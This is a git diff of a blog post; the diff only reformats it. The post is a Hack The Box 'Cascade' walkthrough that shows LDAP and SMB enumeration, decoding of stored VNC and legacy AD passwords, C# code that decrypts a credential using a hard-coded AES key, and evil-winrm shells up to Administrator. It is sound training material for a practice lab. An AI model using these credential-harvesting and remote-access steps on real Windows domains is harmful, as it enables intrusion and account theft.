@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Cascade"
-date:   2020-07-26 13:28:00 +0800
-categories: hackthebox
-tags: smb dotnet sqlite winrm windows 
+title: Hack The Box - Cascade
+date: 2020-07-26 13:28:00 +0800
+categories: [hackthebox]
+tags: [smb, dotnet, sqlite, winrm, windows]
 ---
 
 ![](/assets/images/cascade.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.182 cascade.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC cascade.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 04:22 EDT
 Nmap scan report for cascade.htb (10.10.10.182)
@@ -57,31 +56,31 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 227.43 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
 Seeing that the box belongs to the `cascade.local` domain, we will append it to our `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ cat /etc/hosts
 ...
 10.10.10.182 cascade.htb cascade.local
-{% endhighlight %}
+```
 
 Seeing that `ldap` service is running on port `389`, we will use `ldapsearch`.
 
-{% highlight bash %}
+```bash
 $ ldapsearch -x -h cascade.local -b "dc=cascade,dc=local"
 ...
 cascadeLegacyPwd: clk0bjVldmE=
-{% endhighlight %}
+```
 
 After eye-balling for a while, I saw a peculiar "cascadeLegacyPwd" which seems to be in `base64. Decoding it reveals "rY4n5eva"
 
 This field was under a user called "r.thompson". Perhaps this password is still being in used? We can use the `smb` service to verify.
 
-{% highlight bash %}
+```bash
 $ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva
 [+] Finding open SMB ports....
 [+] User SMB session established on cascade.local...
@@ -120,13 +119,13 @@ $ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva
         dr--r--r--                0 Thu Jan  9 10:31:27 2020    ..
         dr--r--r--                0 Thu Jan  9 10:31:27 2020    cascade.local
         SYSVOL                                                  READ ONLY       Logon server share 
-{% endhighlight %}
+```
 
 As `r.thompson`, we are only able to read from `Data`, `NETLOGON`, `print$` and `SYSVOL`. Time to start digging around!
 
 
 
-{% highlight bash %}
+```bash
 $ smbclient //cascade.local/Data -U r.thompson
 Enter WORKGROUP\r.thompson's password: 
 Try "help" to get a list of possible commands.
@@ -139,19 +138,19 @@ smb: \IT\Temp\s.smith\> dir
                 13106687 blocks of size 4096. 7792770 blocks available
 smb: \IT\Temp\s.smith\> get "VNC Install.reg"
 getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)               
-{% endhighlight %}
+```
 
 In `\IT\Temp\s.smith\` was a file called `VNC Install.reg`. After downloading and reading it, we see something interesting.
 
-{% highlight bash %}
+```bash
 $ cat "VNC Install.reg"
 ...
 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
-{% endhighlight %}
+```
 
 This password can be decoded by using `msfconsole`.
 
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > irb
 [*] Starting IRB shell...
@@ -162,11 +161,11 @@ msf5 > irb
 => true
 >> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
 => "sT333ve2"
-{% endhighlight %}
+```
 
 Since the file was found in a directory belonging `s.smith`, we assume that this is his password. Lets test it out. 
 
-{% highlight bash %}
+```bash
 $ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2
 [+] Finding open SMB ports....
 [+] User SMB session established on cascade.local...
@@ -187,7 +186,7 @@ $ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2
         dr--r--r--                0 Tue Jan 28 15:42:18 2020    x86
         Audit$                                                  READ ONLY
 ...
-{% endhighlight %}
+```
 
 Using `s.smith`, we now have access to an additional share `Audit$`. Wait, we haven't found `user.txt`?
 
@@ -195,7 +194,7 @@ Using `s.smith`, we now have access to an additional share `Audit$`. Wait, we ha
 
 Running a second `nmap` scan but with all ports reveals an additional service we can use: `winrm` on port `5985`. Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm),
 
-{% highlight bash %}
+```bash
 $ ruby evil-winrm.rb -i cascade.local -u s.smith -p sT333ve2
 Evil-WinRM shell v2.3
 
@@ -203,16 +202,16 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\s.smith\Documents> type ../Desktop/user.txt
 003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 Back to the `Audit$` share, there were quite a few interesting files. After downloading all the files, I first checked out `\DB\Audit.db`.
 
-{% highlight bash %}
+```bash
 $ file Audit.db 
 Audit.db: SQLite 3.x database, last written using SQLite version 3027002
-{% endhighlight %}
+```
 
 Fortunately, Kali Linux comes pre-installed with a SQLite Database browser.
 
@@ -236,23 +235,23 @@ It seems like we found a username `ArkSvc` and its password which appears to be 
 
 The next file I checked was `RunAudit.bat`.
 
-{% highlight bash %}
+```bash
 $ cat RunAudit.bat
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
-{% endhighlight %}
+```
 
 Hmm... This batch script is runnig `CascAudit.exe` and using `Audit.db` as a command line argument. Perhaps it is writing/reading from it? Lets check out `CascAudit.exe` next.
 
-{% highlight bash %}
+```bash
 $ file CascAudit.exe 
 CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
-{% endhighlight %}
+```
 
 Fortunately, it was written in `.NET`, meaning we can decompile it to obtain its original source code! I will be transferring `CascAudit.exe` to my FlareVM, which has `ILSpy` installed. 
 
 `CascAudit.exe`:
 
-{% highlight dotnet %}
+```csharp
 ...
 sQLiteConnection.Open();
 SQLiteCommand sQLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sQLiteConnection);
@@ -279,13 +278,13 @@ try
                 }
         }
 ...
-{% endhighlight %}
+```
 
 In this code segment, it is attempting to select records from the `LDAP` table and decrypt the encrypted string in the "Pwd" column with a hard-coded key `c4scadek3y654321`. The decrypt function used was from a custom class called `Crypto`, which was in another file in the `Audit$` share called `CascCrypto.dll`. Opening it up with `ILSpy`,
 
 `CascCrypto.dll`:
 
-{% highlight dotnet %}
+```csharp
 public class Crypto
 {
 	public const string DefaultIV = "1tdyjCbY1Ix49842";
@@ -333,13 +332,13 @@ public class Crypto
 		}
 	}
 }
-{% endhighlight %}
+```
 
 To decrypt the encrypted password in the `Audit.db`, we can simply just make use of the `DecryptString` method that was already implemented for us. I am not well-versed on how to setup an environment for `.NET` but I know there are websites like [this](https://dotnetfiddle.net/) that allows you run any `.NET` code ! :)
 
 This is how my final code looks like:
 
-{% highlight dotnet %}
+```csharp
 using System;
 using System.IO;
 using System.Security.Cryptography;
@@ -372,13 +371,13 @@ public class Program
 		Console.WriteLine(DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"));
 	}
 }
-{% endhighlight %}
+```
 
 After executing, we get the output `w3lc0meFr31nd`.
 
 Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) again, we establish a shell as `ArkSvc`.
 
-{% highlight bash %}
+```bash
 $ ruby evil-winrm.rb -i cascade.local -u ArkSvc -p w3lc0meFr31nd
 
 Evil-WinRM shell v2.3
@@ -386,24 +385,24 @@ Evil-WinRM shell v2.3
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\arksvc\Documents> 
-{% endhighlight %}
+```
 
 Going back to the `Data` share, there was a file `Meeting_Notes_June_2018.html` in `\IT\Email Archives\`:
 
-{% highlight raw %}
+```
 ...
 <p>-- We will be using a temporary account to
 perform all tasks related to the network migration and this account will be deleted at the end of
 2018 once the migration is complete. This will allow us to identify actions
 related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
 ...
-{% endhighlight %}
+```
 
 Hmm... If we can somehow recover `TempAdmin`, we might be able to get the password of the `Administrator` account!
 
 Lets see if we can retrieve information about deleted objects!
 
-{% highlight raw %}
+```
 *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -properties *
 ...
 accountExpires                  : 9223372036854775807
@@ -414,7 +413,7 @@ CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 CN                              : TempAdmin
 ...
-{% endhighlight %}
+```
 
 Like `r.thompson`, `TempAdmin` had a `cascadeLegacyPwd`, which is `baCT3r1aN00dles` when decoded!
 
@@ -422,7 +421,7 @@ Like `r.thompson`, `TempAdmin` had a `cascadeLegacyPwd`, which is `baCT3r1aN00dl
 
 Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) for the final time, we finally get our flag!
 
-{% highlight bash %}
+```bash
 $ ruby evil-winrm.rb -i cascade.local -u Administrator -p baCT3r1aN00dles
 Evil-WinRM shell v2.3                                                                                                                
                                                                                                                                      
@@ -430,6 +429,6 @@ Info: Establishing connection to remote endpoint
                                                                                                                                          
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
 f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
